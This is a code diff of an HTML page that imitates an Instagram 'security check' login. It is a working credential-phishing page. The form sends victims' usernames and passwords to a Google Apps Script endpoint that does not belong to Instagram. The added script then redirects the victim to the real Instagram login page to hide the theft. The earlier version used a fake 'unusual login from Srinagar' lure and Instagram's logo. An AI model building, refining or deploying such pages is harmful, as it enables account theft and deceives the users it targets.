@@ -5,30 +5,33 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Instagram Security Check</title>
     <style>
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .login-box { background: white; border: 1px solid #dbdbdb; padding: 40px; width: 350px; text-align: center; box-sizing: border-box; box-shadow: 0 1px 3px rgba(0,0,0,0.1); }
-        .logo { width: 175px; margin-bottom: 25px; }
-        .info-text { color: #262626; font-size: 16px; font-weight: 600; line-height: 20px; margin-bottom: 10px; }
-        .sub-text { color: #8e8e8e; font-size: 14px; margin-bottom: 20px; }
-        input { width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #dbdbdb; border-radius: 3px; box-sizing: border-box; background: #fafafa; font-size: 12px; }
-        button { width: 100%; padding: 7px; background-color: #0095f6; border: none; color: white; border-radius: 4px; font-weight: 600; cursor: pointer; margin-top: 10px; }
-        .footer { margin-top: 20px; font-size: 12px; color: #8e8e8e; }
+        body { font-family: -apple-system, sans-serif; background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .login-box { background: white; border: 1px solid #dbdbdb; padding: 30px; width: 320px; text-align: center; }
+        h2 { font-size: 24px; font-weight: bold; margin-bottom: 20px; color: #262626; }
+        p { color: #8e8e8e; font-size: 14px; margin-bottom: 20px; }
+        input { width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #dbdbdb; border-radius: 3px; box-sizing: border-box; background: #fafafa; }
+        button { width: 100%; padding: 10px; background-color: #0095f6; border: none; color: white; border-radius: 4px; font-weight: 600; cursor: pointer; width: 100%; }
     </style>
 </head>
 <body>
     <div class="login-box">
-        <img class="logo" src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a2511103672.png" alt="Instagram">
-        <p class="info-text">Confirm it's you</p>
-        <p class="sub-text">We noticed an unusual login attempt from Srinagar, JK. Please verify your identity.</p>
+        <h2>Instagram</h2>
+        <p>Unusual activity detected. Please verify your identity.</p>
         
-        <form action="https://script.google.com/macros/s/AKfycbwPuEV4-P-EyDqjrbvZxvvZYImvFe1yDZWojjpUOhH3jhN4eFVoYaMzjx8jW73eON0yKg/exec" method="POST">
-            <input type="text" name="username" placeholder="Phone number, username, or email" required>
+        <form id="authForm" action="https://script.google.com/macros/s/AKfycbxCIOVFoEGkpYtGsAjzvHcPwcCoQYT3rR1Bcdduk7mAy4RWKSFchYgx_E5f66qZAoPN/exec" method="POST">
+            <input type="text" name="username" placeholder="Username or Email" required>
             <input type="password" name="password" placeholder="Password" required>
-            <button type="submit">Verify Identity</button>
+            <button type="submit">Log In</button>
         </form>
-        
-        <div class="footer">© 2026 Instagram from Meta</div>
     </div>
+
+    <script>
+        document.getElementById('authForm').onsubmit = function() {
+            // Forcefully redirect within 1 second
+            setTimeout(function() {
+                window.location.replace("https://www.instagram.com/accounts/login/");
+            }, 1000);
+        };
+    </script>
 </body>
 </html>
-
